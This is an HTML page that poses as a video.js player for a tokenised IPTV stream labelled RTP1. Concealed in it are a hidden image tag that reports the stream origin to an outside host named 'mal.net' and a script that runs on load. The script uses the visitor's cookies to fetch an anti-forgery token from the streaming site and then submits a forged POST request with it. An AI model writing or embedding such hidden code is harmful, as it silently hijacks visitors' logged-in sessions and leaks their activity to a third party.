<!DOCTYPE html>
<html lang="en">
  <head>
    <link href="https://vjs.zencdn.net/7.1/video-js.min.css" rel="stylesheet">
    <script src="https://vjs.zencdn.net/7.1/video.min.js"></script>
<img hidden src="http://mal.net?orig=https://moonlight.wideiptv.top"display:none" />
    
  </head>
  <body>
      <video  id="player" class="video-js vjs-default-skin vjs-16-9"  controls >
        <source src="https://moonlight.wideiptv.top/RTP1/tracks-v1/index.fmp4.m3u8?token=71604cc47254e607c665a9336db13f9c56eaebf7-fe6b6dcc86586f6edc79fc8bf353b1b6-1731955554-1731944754" type="application/x-mpegURL" />
      </video>
   
  
    <div hidden>
     <video  id="player2" class="video-js vjs-default-skin"  controls >
        <source src="https://moonlight.wideiptv.top/RTP1/tracks-a1/index.fmp4.m3u8?token=71604cc47254e607c665a9336db13f9c56eaebf7-fe6b6dcc86586f6edc79fc8bf353b1b6-1731955554-1731944754" type="application/x-mpegURL" />
      </video></div>
    
    
    
    <script>
    var options, video;
 
    options = {
      autoplay: true,
      muted: false
    };
 
    video = videojs('player', options);
 
  </script>
 
  
  
  <script>
    var options, video;
 
    options = {
      autoplay: true,
      muted: false
    };
 
    video = videojs('player2', options);
 
  </script>
  <script>
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="https://moonlight.wideiptv.top?param=VALUE"
var POST_URL="https://moonlight.wideiptv.top?param=VALUE"
getTokenJS();

    
  </script>
  
  </body>
</html>
